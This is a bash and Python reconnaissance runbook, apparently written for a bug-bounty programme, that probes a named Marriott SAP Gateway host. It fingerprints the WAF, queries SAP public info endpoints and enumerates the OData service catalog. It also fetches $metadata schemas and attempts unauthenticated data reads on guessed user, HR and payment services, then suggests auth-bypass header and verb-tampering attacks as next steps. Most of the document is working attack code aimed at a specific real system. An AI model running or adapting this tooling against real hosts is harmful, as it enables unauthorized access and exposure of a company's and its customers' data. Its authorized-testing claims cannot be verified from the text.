#!/usr/bin/env bash
# =============================================================================
# M024 — SAP NetWeaver/Gateway recon on gatewaydsapuat2.marriott.com
# Portable: Linux / Pi / Termux.
#
# Why: S22 showed OData paths (/sap/opu/odata/...) return ORIGIN 404/35B, distinct
# from Akamai's WAF 404/261B — i.e. requests to /sap/* reach the SAP backend past
# the WAF. This runbook maps the SAP ICF surface and hunts the classic, undeniable
# unauth findings: /sap/public/info system disclosure, OData service catalog
# enumeration, $metadata schema leak, and unauth entity-set data reads.
#
# SAFETY / SCOPE:
#   - IN-SCOPE confirmed: gateway*.marriott.com (scope-check.sh).
#   - READ-ONLY. GET + OData $metadata/$top only. No writes, no $batch mutations,
#     no SOAP RFC calls, no destructive verbs. Conservative pacing (sleep 0.4s).
#   - NEVER follow redirects to out-of-scope IdPs (extranet*/extranetcloud* = OOS).
#   - This is recon + read PoC, NOT mass fuzzing (well under any rate policy).
#
# Run (Termux): OUTDIR=$HOME/s27 bash runbooks/PI-RUNBOOK-session27-sap-odata.sh \
#                 2>&1 | tee $HOME/s27/s27.log
# =============================================================================
set -eo pipefail

if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s27
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s27"
  else OUTDIR="$HOME/s27"; fi
fi
export OUTDIR
mkdir -p "$OUTDIR"

HOST="gatewaydsapuat2.marriott.com"
BASE="https://$HOST"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
# Marriott program asks for an identifying header on automated traffic:
IDH='X-Bug-Bounty: hackerone-researcher'

echo "============================================================"
echo "M024 SAP ODATA RECON  $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "Host: $HOST   Work dir: $OUTDIR"
echo "Researcher IP: $(curl -s ifconfig.me)"
echo "============================================================"
echo ""

# Helper: GET a path, save body, print status/size/type. Never follows redirects
# (so we never chase an OOS IdP). $1=path  $2=tag  [$3=extra curl args]
probe() {
  local path="$1" tag="$2"; shift 2
  local out="$OUTDIR/$tag.txt" metrics code size loc ctype
  # Tab-delimited so the space in content_type and an empty redirect_url
  # don't misalign the fields.
  metrics=$(curl -s -o "$out" -D "$OUTDIR/$tag.hdr" \
      -H "User-Agent: $UA" -H "$IDH" \
      "$@" \
      -w '%{http_code}\t%{size_download}\t%{redirect_url}\t%{content_type}' \
      "$BASE$path" 2>/dev/null) || metrics=$'000\t0\t\t-'
  IFS=$'\t' read -r code size loc ctype <<< "$metrics"
  printf '  [%-3s %6sB] %-46s %s\n' "$code" "$size" "$path" "${ctype%%;*}"
  [ -n "$loc" ] && printf '         -> redirect: %s\n' "$loc"
  echo "$code" > "$OUTDIR/$tag.code"
  sleep 0.4
}

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 0 — BASELINE / WAF CALIBRATION
# Establish the three response fingerprints so we can read every later result:
#   Akamai WAF block (~261B)  vs  SAP origin 404 (~35B)  vs  real content.
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE 0: BASELINE / WAF CALIBRATION ═══"
probe "/"                              p0-root
probe "/definitely-not-real-$RANDOM"   p0-rand404
probe "/sap/opu/odata/sap/NOPE_$RANDOM/" p0-saprand
echo ""
echo "Note the byte sizes above: a ~261B body = Akamai WAF block; a small ~35B"
echo "body on /sap/* = SAP origin 404 (request reached the backend)."
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 1 — SAP PUBLIC ICF SERVICES (classic unauth disclosure)
# /sap/public/* is designed to be reachable without auth. /sap/public/info leaks
# the SAP system fingerprint (SID, DB, OS, patch level) — a clean info finding and
# a pivot for CVE selection.
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE 1: SAP PUBLIC ICF SERVICES ═══"
probe "/sap/public/info"                    p1-info
probe "/sap/public/ping"                    p1-ping
probe "/sap/public/icf_info/icr_groups"     p1-icrgroups
probe "/sap/public/icman/ping"              p1-icman
probe "/sap/bc/ping"                        p1-bcping
probe "/sap/admin/public/index.html"        p1-admin
echo ""
echo "[P1] /sap/public/info body (first 600 bytes if returned):"
head -c 600 "$OUTDIR/p1-info.txt" 2>/dev/null; echo; echo

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 2 — ODATA SERVICE CATALOG ENUMERATION
# If the catalog service answers without auth, it lists every published OData
# service = full attack-surface map. Try both catalog namespaces + versions.
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE 2: ODATA SERVICE CATALOG ═══"
probe "/sap/opu/odata/IWFND/CATALOGSERVICE;v=2/"                 p2-cat2
probe "/sap/opu/odata/IWFND/CATALOGSERVICE;v=2/ServiceCollection?\$format=json&\$top=50" p2-cat2-svc
probe "/sap/opu/odata/IWFND/CATALOGSERVICE/"                     p2-cat1
probe "/sap/opu/odata/IWFND/CATALOGSERVICE/ServiceCollection?\$format=json&\$top=50"     p2-cat1-svc
probe "/sap/opu/odata/iwfnd/catalogservice;v=2/\$metadata"       p2-cat2-meta
# Newer catalog (V4) + REST catalog
probe "/sap/opu/odata4/iwfnd/config/default/iwfnd/catalog/0002/" p2-cat4
echo ""
echo "[P2] catalog ServiceCollection (first 800 bytes if returned):"
head -c 800 "$OUTDIR/p2-cat2-svc.txt" 2>/dev/null; echo; echo
# Pull any service names the catalog leaked, for Phase 4
python3 - << 'PYEOF' || true
import os, re, json
O=os.environ["OUTDIR"]; names=set()
for f in ("p2-cat2-svc.txt","p2-cat1-svc.txt"):
    p=os.path.join(O,f)
    if os.path.exists(p):
        t=open(p,encoding="utf-8",errors="replace").read()
        # JSON 'TechnicalServiceName' / 'ID' or XML <d:TechnicalServiceName>
        names |= set(re.findall(r'"TechnicalServiceName"\s*:\s*"([^"]+)"', t))
        names |= set(re.findall(r'<d:TechnicalServiceName>([^<]+)</d:TechnicalServiceName>', t))
        names |= set(re.findall(r'"ID"\s*:\s*"([A-Z0-9_]{4,})"', t))
if names:
    open(os.path.join(O,"catalog-services.txt"),"w").write("\n".join(sorted(names)))
    print(f"  catalog leaked {len(names)} service names -> catalog-services.txt")
    for n in sorted(names)[:40]: print("    ", n)
else:
    print("  no service names parsed from catalog (likely auth-gated or empty).")
PYEOF
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 3 — AUTH FINGERPRINT ON A CATALOG/ODATA ROOT
# Distinguish 401(auth required) vs 403(WAF) vs 200(open). Capture WWW-Authenticate
# to identify the auth scheme (Basic/SAML/Negotiate) for the writeup.
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE 3: AUTH SCHEME FINGERPRINT ═══"
for tag in p2-cat2 p1-info; do
  if [ -f "$OUTDIR/$tag.hdr" ]; then
    echo "  $tag auth headers:"
    grep -iE 'www-authenticate|sap-|x-csrf|set-cookie' "$OUTDIR/$tag.hdr" | sed 's/^/    /' || echo "    (none)"
  fi
done
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 4 — COMMON ODATA SERVICES: $metadata + unauth data read
# SAP ships demo/standard services that are frequently left published. For each:
# probe $metadata (schema leak) then a single $top=1 row (unauth data read).
# Add any names the catalog leaked in Phase 2.
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE 4: COMMON ODATA SERVICES ($metadata + $top=1) ═══"
SERVICES="GWSAMPLE_BASIC ZGWSAMPLE_BASIC /IWBEP/GWSAMPLE_BASIC ZAPI_USER_SRV \
ZUSER_SRV API_USER_SRV ZHR_SRV ZFI_SRV ZSD_SRV ZMM_SRV PS_USERLIST_SRV \
ZPARTNER_SRV ZVENDOR_SRV ZSUPPLIER_SRV ZPAYMENT_SRV ZINVOICE_SRV"
# Merge catalog-derived names if present
if [ -f "$OUTDIR/catalog-services.txt" ]; then
  SERVICES="$SERVICES $(tr '\n' ' ' < "$OUTDIR/catalog-services.txt")"
fi
i=0
for S in $SERVICES; do
  i=$((i+1))
  safe=$(echo "$S" | tr '/' '_')
  probe "/sap/opu/odata/sap/${S#/}/\$metadata"      "p4-${i}-${safe}-meta"
  probe "/sap/opu/odata/sap/${S#/}/?\$format=json"  "p4-${i}-${safe}-root"
done
echo ""
echo "[P4] any service whose \$metadata returned 200 + XML (schema leak):"
python3 - << 'PYEOF' || true
import os,glob
O=os.environ["OUTDIR"]; hits=[]
for code in glob.glob(os.path.join(O,"p4-*-meta.code")):
    c=open(code).read().strip()
    body=code[:-5]+".txt"
    if c=="200" and os.path.exists(body):
        t=open(body,encoding="utf-8",errors="replace").read()
        if "Edmx" in t or "EntityType" in t:
            hits.append(os.path.basename(body))
if hits:
    print("  SCHEMA LEAK on:", ", ".join(hits))
    for h in hits[:5]:
        print(f"  --- {h} (first 500B) ---")
        print(open(os.path.join(O,h),encoding='utf-8',errors='replace').read()[:500])
else:
    print("  none returned 200 XML metadata (all auth-gated or absent).")
PYEOF
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 5 — SAP ICF APP SURFACE (Web Dynpro / BSP / WebGUI presence)
# Presence (even if auth-gated) confirms an exposed ABAP app server and frames
# CVE selection. Read-only existence checks only.
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE 5: ICF APP SURFACE (presence only) ═══"
probe "/sap/bc/webdynpro/"               p5-wd
probe "/sap/bc/gui/sap/its/webgui"       p5-webgui
probe "/sap/bc/bsp/sap/"                 p5-bsp
probe "/sap/bc/bsp/sap/it00/default.htm" p5-it00
probe "/sap/es/ina/"                     p5-ina
probe "/sap/bc/srt/"                     p5-srt
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# DECISION GATE
# ─────────────────────────────────────────────────────────────────────────────
echo "════════════════════════════════════════════"
echo "DECISION GATE"
echo "════════════════════════════════════════════"
python3 - << 'PYEOF'
import os,glob
O=os.environ["OUTDIR"]
def code(tag):
    p=os.path.join(O,tag+".code")
    return open(p).read().strip() if os.path.exists(p) else "---"
def size(tag):
    p=os.path.join(O,tag+".txt")
    return os.path.getsize(p) if os.path.exists(p) else 0

print(f"/sap/public/info      : HTTP {code('p1-info')}  {size('p1-info')}B")
print(f"/sap/public/ping      : HTTP {code('p1-ping')}  {size('p1-ping')}B")
print(f"catalog v2            : HTTP {code('p2-cat2')}  {size('p2-cat2')}B")
print(f"catalog ServiceColl   : HTTP {code('p2-cat2-svc')}  {size('p2-cat2-svc')}B")
print()
flags=[]
if code('p1-info')=='200' and size('p1-info')>50:
    flags.append("PURSUE: /sap/public/info returned content -> SAP system disclosure (read body)")
if code('p2-cat2-svc')=='200' and size('p2-cat2-svc')>200:
    flags.append("PURSUE: OData catalog enumerable unauth -> full service map (HIGH)")
meta_hits=[f for f in glob.glob(os.path.join(O,'p4-*-meta.code')) if open(f).read().strip()=='200']
if meta_hits:
    flags.append(f"PURSUE: {len(meta_hits)} OData service(s) leak $metadata unauth")
if not flags:
    flags.append("All high-value paths appear auth-gated/WAF'd. Next: header-based")
    flags.append("auth bypass (sap-user, X-SAP-*), HTTP verb tampering, /sap/public/ deeper paths.")
for f in flags: print("  *", f)
PYEOF
echo ""
echo "Evidence: $OUTDIR   (headers in *.hdr, bodies in *.txt)"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
